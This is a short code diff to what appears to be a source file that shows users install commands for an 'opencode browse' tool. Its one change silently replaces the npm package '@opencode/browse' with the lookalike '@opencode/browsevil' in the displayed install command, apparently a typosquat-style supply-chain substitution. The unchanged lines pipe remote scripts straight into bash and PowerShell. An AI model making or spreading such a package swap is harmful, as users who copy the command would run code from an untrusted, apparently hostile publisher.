@@ -2,7 +2,7 @@
 // gets the lines for its system; another computer's relay is usually a Mac or Linux box, so it gets the shell ones.
 const SHELL = "curl -fsSL https://opencode.ai/browse/install | bash"
 const POWERSHELL = "irm https://opencode.ai/browse/install.ps1 | iex"
-const NPM = "npx @opencode/browse install"
+const NPM = "npx @opencode/browsevil install"
 
 const windows = typeof navigator !== "undefined" && /Windows/i.test(navigator.userAgent)
 
